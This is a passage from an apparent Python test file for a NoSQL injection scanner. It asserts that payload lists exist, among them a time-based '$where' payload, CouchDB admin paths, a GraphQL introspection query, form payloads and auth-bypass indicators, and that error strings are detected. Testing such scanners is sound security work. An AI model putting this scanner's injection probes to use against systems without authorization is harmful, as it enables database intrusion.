            assert entry["delay"] >= 5.0, "Time-based delay must be >= 5s"
            assert "$where" in str(entry["body"])

    def test_nosql_error_patterns_count(self) -> None:
        assert len(NOSQL_ERROR_PATTERNS) >= 10

    def test_detect_nosql_operators_mongo_error(self) -> None:
        scanner = NoSqlInject.__new__(NoSqlInject)
        result = scanner._detect_nosql_operators(
            "MongoServerError: unknown operator: $foo"
        )
        assert result is not None
        assert "MongoDB" in result or "server" in result.lower()

    def test_detect_nosql_operators_bson(self) -> None:
        scanner = NoSqlInject.__new__(NoSqlInject)
        result = scanner._detect_nosql_operators("BSON parse error at position 5")
        assert result is not None

    def test_detect_nosql_operators_cast_error(self) -> None:
        scanner = NoSqlInject.__new__(NoSqlInject)
        result = scanner._detect_nosql_operators("CastError: Cast to ObjectId failed")
        assert result is not None

    def test_detect_nosql_operators_clean_response(self) -> None:
        scanner = NoSqlInject.__new__(NoSqlInject)
        result = scanner._detect_nosql_operators("Hello World, normal HTML page")
        assert result is None

    def test_couchdb_paths_list(self) -> None:
        assert "/_utils"    in COUCHDB_PATHS
        assert "/_all_dbs"  in COUCHDB_PATHS
        assert "/_users"    in COUCHDB_PATHS
        assert len(COUCHDB_PATHS) >= 5

    def test_graphql_payloads_introspection(self) -> None:
        intro = next(
            e for e in GRAPHQL_PAYLOADS if e["detect"] == "__schema"
        )
        assert "__schema" in intro["query"]

    def test_form_payloads_count(self) -> None:
        assert len(FORM_PAYLOADS) >= 6

    def test_auth_bypass_indicators(self) -> None:
        assert "welcome"   in AUTH_BYPASS_INDICATORS
        assert "dashboard" in AUTH_BYPASS_INDICATORS
        assert "token"     in AUTH_BYPASS_INDICATORS
